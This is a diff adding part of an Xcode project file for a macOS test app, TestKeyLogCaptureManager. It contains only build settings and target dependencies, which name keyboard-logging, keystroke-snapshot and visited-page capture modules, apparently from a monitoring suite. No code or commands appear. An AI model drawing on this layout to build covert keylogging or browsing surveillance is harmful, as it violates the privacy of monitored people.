+			isa = PBXReferenceProxy;
+			fileType = archive.ar;
+			path = libFxStdMac.a;
+			remoteRef = C29A30EE1839D27C008867AF /* PBXContainerItemProxy */;
+			sourceTree = BUILT_PRODUCTS_DIR;
+		};
+		C29A31021839D2E6008867AF /* fmdb */ = {
+			isa = PBXReferenceProxy;
+			fileType = "compiled.mach-o.executable";
+			path = fmdb;
+			remoteRef = C29A31011839D2E6008867AF /* PBXContainerItemProxy */;
+			sourceTree = BUILT_PRODUCTS_DIR;
+		};
+		C29A31041839D2E6008867AF /* libFMDB.a */ = {
+			isa = PBXReferenceProxy;
+			fileType = archive.ar;
+			path = libFMDB.a;
+			remoteRef = C29A31031839D2E6008867AF /* PBXContainerItemProxy */;
+			sourceTree = BUILT_PRODUCTS_DIR;
+		};
+		C29A31061839D2E6008867AF /* libFMDBMac.a */ = {
+			isa = PBXReferenceProxy;
+			fileType = archive.ar;
+			path = libFMDBMac.a;
+			remoteRef = C29A31051839D2E6008867AF /* PBXContainerItemProxy */;
+			sourceTree = BUILT_PRODUCTS_DIR;
+		};
+		C2F163B617FD5FB700347B20 /* libKeyboardCaptureManager.a */ = {
+			isa = PBXReferenceProxy;
+			fileType = archive.ar;
+			path = libKeyboardCaptureManager.a;
+			remoteRef = C2F163B517FD5FB700347B20 /* PBXContainerItemProxy */;
+			sourceTree = BUILT_PRODUCTS_DIR;
+		};
+/* End PBXReferenceProxy section */
+
+/* Begin PBXResourcesBuildPhase section */
+		C23ED7CF17F9504F0037CF6D /* Resources */ = {
+			isa = PBXResourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				C23ED7E017F9504F0037CF6D /* InfoPlist.strings in Resources */,
+				C23ED7E617F9504F0037CF6D /* Credits.rtf in Resources */,
+				C23ED7EC17F9504F0037CF6D /* MainMenu.xib in Resources */,
+				C298484517F98162003A6391 /* Window.xib in Resources */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXResourcesBuildPhase section */
+
+/* Begin PBXSourcesBuildPhase section */
+		C23ED7CD17F9504F0037CF6D /* Sources */ = {
+			isa = PBXSourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				C23ED7E317F9504F0037CF6D /* main.m in Sources */,
+				C23ED7E917F9504F0037CF6D /* TestKeyLogCaptureManagerAppDelegate.m in Sources */,
+				C298484817F98198003A6391 /* ac.m in Sources */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXSourcesBuildPhase section */
+
+/* Begin PBXTargetDependency section */
+		352F22E11A84ECFE00D06E9F /* PBXTargetDependency */ = {
+			isa = PBXTargetDependency;
+			name = KeyboardLoggerManager;
+			targetProxy = 352F22E01A84ECFE00D06E9F /* PBXContainerItemProxy */;
+		};
+		354A06581AB7F8570029BA7D /* PBXTargetDependency */ = {
+			isa = PBXTargetDependency;
+			name = SystemUtilsMac;
+			targetProxy = 354A06571AB7F8570029BA7D /* PBXContainerItemProxy */;
+		};
+		354A06651AB7F9270029BA7D /* PBXTargetDependency */ = {
+			isa = PBXTargetDependency;
+			name = PageVisitedCaptureManager;
+			targetProxy = 354A06641AB7F9270029BA7D /* PBXContainerItemProxy */;
+		};
+		C29A2F421839CE5D008867AF /* PBXTargetDependency */ = {
+			isa = PBXTargetDependency;
+			name = KeyboardEventHandler;
+			targetProxy = C29A2F411839CE5D008867AF /* PBXContainerItemProxy */;
+		};
+		C29A30E11839D1F0008867AF /* PBXTargetDependency */ = {
+			isa = PBXTargetDependency;
+			name = FxEventsMac;
+			targetProxy = C29A30E01839D1F0008867AF /* PBXContainerItemProxy */;
+		};
+		C29A30F11839D287008867AF /* PBXTargetDependency */ = {
+			isa = PBXTargetDependency;
+			name = FxStdMac;
+			targetProxy = C29A30F01839D287008867AF /* PBXContainerItemProxy */;
+		};
+		C29A31081839D2ED008867AF /* PBXTargetDependency */ = {
+			isa = PBXTargetDependency;
+			name = FMDBMac;
+			targetProxy = C29A31071839D2ED008867AF /* PBXContainerItemProxy */;
+		};
+		C2F163B817FD5FD200347B20 /* PBXTargetDependency */ = {
+			isa = PBXTargetDependency;
+			name = KeyboardCaptureManager;
+			targetProxy = C2F163B717FD5FD200347B20 /* PBXContainerItemProxy */;
+		};
+/* End PBXTargetDependency section */
+
+/* Begin PBXVariantGroup section */
+		C23ED7DE17F9504F0037CF6D /* InfoPlist.strings */ = {
+			isa = PBXVariantGroup;
+			children = (
+				C23ED7DF17F9504F0037CF6D /* en */,
+			);
+			name = InfoPlist.strings;
+			sourceTree = "<group>";
+		};
+		C23ED7E417F9504F0037CF6D /* Credits.rtf */ = {
+			isa = PBXVariantGroup;
+			children = (
+				C23ED7E517F9504F0037CF6D /* en */,
+			);
+			name = Credits.rtf;
+			sourceTree = "<group>";
+		};
+		C23ED7EA17F9504F0037CF6D /* MainMenu.xib */ = {
+			isa = PBXVariantGroup;
+			children = (
+				C23ED7EB17F9504F0037CF6D /* en */,
+			);
+			name = MainMenu.xib;
+			sourceTree = "<group>";
+		};
+/* End PBXVariantGroup section */
+
+/* Begin XCBuildConfiguration section */
+		C23ED7ED17F9504F0037CF6D /* Debug */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				ARCHS = "$(ARCHS_STANDARD_32_64_BIT)";
+				GCC_C_LANGUAGE_STANDARD = gnu99;
+				GCC_OPTIMIZATION_LEVEL = 0;
+				GCC_PREPROCESSOR_DEFINITIONS = DEBUG;
+				GCC_SYMBOLS_PRIVATE_EXTERN = NO;
+				GCC_VERSION = com.apple.compilers.llvm.clang.1_0;
+				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
+				GCC_WARN_ABOUT_RETURN_TYPE = YES;
+				GCC_WARN_UNUSED_VARIABLE = YES;
+				HEADER_SEARCH_PATHS = (
+					"../../EventCenter/Source-EventCenter/**",
+					"../../Events/FxEvent/**",
+					"../Source-KeyboardCaptureManager/**",
+				);
+				MACOSX_DEPLOYMENT_TARGET = 10.6;
+				ONLY_ACTIVE_ARCH = YES;
+				OTHER_LDFLAGS = (
+					"-ObjC",
+					"-all_load",
+				);
+				SDKROOT = macosx;
+			};
+			name = Debug;
+		};
+		C23ED7EE17F9504F0037CF6D /* Release */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				ARCHS = "$(ARCHS_STANDARD_32_64_BIT)";
+				GCC_C_LANGUAGE_STANDARD = gnu99;
+				GCC_VERSION = com.apple.compilers.llvm.clang.1_0;
+				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
+				GCC_WARN_ABOUT_RETURN_TYPE = YES;
+				GCC_WARN_UNUSED_VARIABLE = YES;
+				HEADER_SEARCH_PATHS = (
+					"../../EventCenter/Source-EventCenter/**",
+					"../../Events/FxEvent/**",
+					"../Source-KeyboardCaptureManager/**",
+				);
+				MACOSX_DEPLOYMENT_TARGET = 10.6;
+				OTHER_LDFLAGS = (
+					"-ObjC",
+					"-all_load",
+				);
+				SDKROOT = macosx;
+			};
+			name = Release;
+		};
+		C23ED7F017F9504F0037CF6D /* Debug */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				ALWAYS_SEARCH_USER_PATHS = YES;
+				COPY_PHASE_STRIP = NO;
+				GCC_DYNAMIC_NO_PIC = NO;
+				GCC_ENABLE_OBJC_EXCEPTIONS = YES;
+				GCC_PRECOMPILE_PREFIX_HEADER = YES;
+				GCC_PREFIX_HEADER = "TestKeyLogCaptureManager/TestKeyLogCaptureManager-Prefix.pch";
+				HEADER_SEARCH_PATHS = (
+					"../../EventCenter/Source-EventCenter/**",
+					"../../Events/FxEvent/**",
+					"../Source-KeyboardCaptureManager/**",
+					"../../KeyboardEventHandler/Source-KeyboardEventHandler/**",
+					"../../Std/FxStd/**",
+					"../../Events/FxEvents/**",
+				);
+				INFOPLIST_FILE = "TestKeyLogCaptureManager/TestKeyLogCaptureManager-Info.plist";
+				LIBRARY_SEARCH_PATHS = (
+					"$(inherited)",
+					"\"$(SRCROOT)\"",
+				);
+				OTHER_LDFLAGS = (
+					"-ObjC",
+					"-all_load",
+				);
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				USER_HEADER_SEARCH_PATHS = "../../KeySnapShotRuleManager/Source-KeySnapShotRuleManager/** ../../KeyboardLoggerManager/Source-KeyboardLoggerManager/**";
+				WRAPPER_EXTENSION = app;
+			};
+			name = Debug;
+		};
+		C23ED7F117F9504F0037CF6D /* Release */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				ALWAYS_SEARCH_USER_PATHS = YES;
+				COPY_PHASE_STRIP = YES;
+				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
+				GCC_ENABLE_OBJC_EXCEPTIONS = YES;
+				GCC_PRECOMPILE_PREFIX_HEADER = YES;
+				GCC_PREFIX_HEADER = "TestKeyLogCaptureManager/TestKeyLogCaptureManager-Prefix.pch";
+				HEADER_SEARCH_PATHS = (
+					"../../EventCenter/Source-EventCenter/**",
+					"../../Events/FxEvent/**",
+					"../Source-KeyboardCaptureManager/**",
+					"../../KeyboardEventHandler/Source-KeyboardEventHandler/**",
+					"../../Std/FxStd/**",
+					"../../Events/FxEvents/**",
+				);
+				INFOPLIST_FILE = "TestKeyLogCaptureManager/TestKeyLogCaptureManager-Info.plist";
+				LIBRARY_SEARCH_PATHS = (
+					"$(inherited)",
+					"\"$(SRCROOT)\"",
+				);
+				OTHER_LDFLAGS = (
+					"-ObjC",
+					"-all_load",
+				);
+				PRODUCT_NAME = "$(TARGET_NAME)";
+				USER_HEADER_SEARCH_PATHS = "../../KeySnapShotRuleManager/Source-KeySnapShotRuleManager/** ../../KeyboardLoggerManager/Source-KeyboardLoggerManager/**";
+				WRAPPER_EXTENSION = app;
+			};
+			name = Release;
+		};
+/* End XCBuildConfiguration section */
+
+/* Begin XCConfigurationList section */
+		C23ED7CB17F9504F0037CF6D /* Build configuration list for PBXProject "TestKeyLogCaptureManager" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				C23ED7ED17F9504F0037CF6D /* Debug */,
+				C23ED7EE17F9504F0037CF6D /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
+		C23ED7EF17F9504F0037CF6D /* Build configuration list for PBXNativeTarget "TestKeyLogCaptureManager" */ = {
+			isa = XCConfigurationList;
+			buildConfigurations = (
+				C23ED7F017F9504F0037CF6D /* Debug */,
+				C23ED7F117F9504F0037CF6D /* Release */,
+			);
+			defaultConfigurationIsVisible = 0;
+			defaultConfigurationName = Release;
+		};
+/* End XCConfigurationList section */
+	};
+	rootObject = C23ED7C817F9504F0037CF6D /* Project object */;
+}
